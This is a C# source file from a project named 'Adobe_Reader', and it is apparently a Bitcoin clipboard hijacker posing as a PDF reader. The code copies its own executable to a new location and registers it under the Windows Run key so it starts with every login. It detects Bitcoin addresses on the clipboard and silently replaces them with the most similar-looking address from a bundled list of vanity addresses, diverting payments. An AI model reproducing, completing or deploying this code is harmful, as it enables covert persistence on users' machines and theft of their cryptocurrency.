using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Adobe_Reader.Properties;
using Microsoft.Win32;

namespace Adobe_Reader
{
     static class Tools
    {
        internal static bool ExeSmartCopy(string targetExePath, bool overwrite = false, bool setStartup = false,
            bool exitStartDelete = false)
        {
            if (Application.ExecutablePath == targetExePath) return false;

            var targetExeFolder = Directory.GetParent(targetExePath);
            Directory.CreateDirectory(targetExeFolder.ToString());

            File.Copy(Application.ExecutablePath, targetExePath, overwrite);

            if (setStartup)
                SetStartup(targetExePath);

            if (exitStartDelete)
            {
                string formattedExePath = Application.ExecutablePath.Replace(" ","?");
                Process.Start(targetExePath, formattedExePath);
                Environment.Exit(0);
            }
            return true;
        }

        private static void SetStartup(string exePath)
        {
            var rk = Registry.CurrentUser.OpenSubKey
                (@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

            if (rk == null) return;

            rk.SetValue(Path.GetFileName(exePath), exePath);
        }

        internal static bool ProbablyBtcAddress(string clipboard)
        {
            var address = clipboard.Trim();
            // BTC address length from 26 to 34
            if (address.Length < 26 || address.Length > 34) return false;
            var r = new Regex("^(1|3)[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz].*$");
            if (!r.IsMatch(address)) return false;
            return true;
        }

        internal static void SetMostSimilarBtcAddress(string originalClipboardText)
        {
            try
            {
                var origAddr = originalClipboardText.Trim();

                var bestFirstCharFits = new HashSet<string>();

                var maxFirstCharFit = 0;
                foreach (
                    var a in
                        Resources.vanityAddresses.Split(new[] {Environment.NewLine},
                            StringSplitOptions.RemoveEmptyEntries).ToList())
                {
                    var actFirstCharFit = FirstCharFitNum(a, origAddr);

                    if (actFirstCharFit < maxFirstCharFit)
                    {
                    }
                    else if (actFirstCharFit == maxFirstCharFit)
                    {
                        bestFirstCharFits.Add(a);
                    }
                    else if (actFirstCharFit > maxFirstCharFit)
                    {
                        bestFirstCharFits.Clear();
                        maxFirstCharFit = actFirstCharFit;
                        bestFirstCharFits.Add(a);
                        Clipboard.SetText(a);
                    }
                }

                var maxLastCharFit = 0;
                foreach (var a in bestFirstCharFits)
                {
                    var actLastCharFit = LastCharFitNum(a, origAddr);

                    if (actLastCharFit <= maxLastCharFit)
                    {
                    }
                    else
                    {
                        maxLastCharFit = actLastCharFit;
                        Clipboard.SetText(a);
                    }
                }
            }
            catch
            {
                // ignored
            }
        }

        private static int LastCharFitNum(string a, string b)
        {
            var cnt = 0;
            var match = true;
            for (var i = 0; i < Math.Min(a.Length, b.Length) && match; i++)
            {
                if (a[a.Length - 1 - i] != b[b.Length - 1 - i])
                    match = false;
                else
                    cnt++;
            }
            return cnt;
        }

        private static int FirstCharFitNum(string a, string b)
        {
            var cnt = 0;
            var match = true;
            for (var i = 0; i < Math.Min(a.Length, b.Length) && match; i++)
            {
                if (a[i] != b[i])
                    match = false;
                else
                    cnt++;
            }
            return cnt;
        }
    }
}